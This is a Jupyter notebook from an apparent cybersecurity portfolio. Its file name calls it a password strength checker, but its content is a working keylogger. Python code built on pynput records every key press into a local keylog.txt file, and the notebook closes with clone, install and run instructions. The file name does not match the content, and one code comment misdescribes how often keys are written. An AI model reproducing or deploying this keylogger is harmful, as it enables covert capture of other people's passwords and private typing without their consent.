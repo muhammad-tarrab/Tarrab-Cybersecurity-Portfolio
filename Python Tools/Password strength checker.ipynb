{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Keylogger Application\n",
    "---\n",
    "This Jupyter Notebook demonstrates a keylogger application using the `pynput` library.\n",
    "The application logs keys pressed on the keyboard and writes them to a file."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import Libraries\n",
    "Import the `keyboard` module from the `pynput` library."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Initialize Global Variables\n",
    "Global list to store pressed keys."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "pressed_keys = []"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Define Function to Write Logged Keys to a File\n",
    "The `write_to_file` function writes logged keys to a file named `keylog.txt`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def write_to_file(keys):\n",
    "    with open(\"keylog.txt\", \"a\") as f:\n",
    "        for key in keys:\n",
    "            f.write(str(key))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Define Function to Handle Key Press Events\n",
    "The `on_press` function logs key press events and calls the `write_to_file` function to save the keys."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    global pressed_keys\n",
    "    try:\n",
    "        # Logging pressed key\n",
    "        pressed_keys.append(key.char)\n",
    "        # Write to file every 10 keys (you can adjust this as needed)\n",
    "        write_to_file(pressed_keys)\n",
    "        pressed_keys = []\n",
    "    except AttributeError:\n",
    "        # Logging special keys (e.g., shift, ctrl, etc.)\n",
    "        pressed_keys.append(\"   \"+str(key)+\"   \")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Set Up Listener for Key Press Events\n",
    "The following code sets up the listener for key press events and starts it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "with keyboard.Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Usage Instructions\n",
    "### Downloading and Running the Code\n",
    "1. Install Git: If you don't have Git installed, download and install it from [git-scm.com](https://git-scm.com/).\n",
    "2. Clone the Repository:\n",
    "   - Open a terminal or command prompt.\n",
    "   - Navigate to the directory where you want to clone the repository.\n",
    "   - Run the following command to clone the repository:\n",
    "     ```sh\n",
    "     git clone https://github.com/muhammad-tarrab/Tarrab-Cybersecurity-Portfolio.git\n",
    "     ```\n",
    "3. Navigate to the Cloned Repository:\n",
    "   ```sh\n",
    "   cd Tarrab-Cybersecurity-Portfolio/Python-Tools\n",
    "   ```\n",
    "4. Run the Script:\n",
    "   - Ensure you have the required library installed. You can install it using pip:\n",
    "     ```sh\n",
    "     pip install pynput\n",
    "     ```\n",
    "   - Run the Python script:\n",
    "     ```sh\n",
    "     python keylogger.py\n",
    "     ```\n",
    "   - Follow the prompts: The keylogger will start running and logging key presses to `keylog.txt`."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
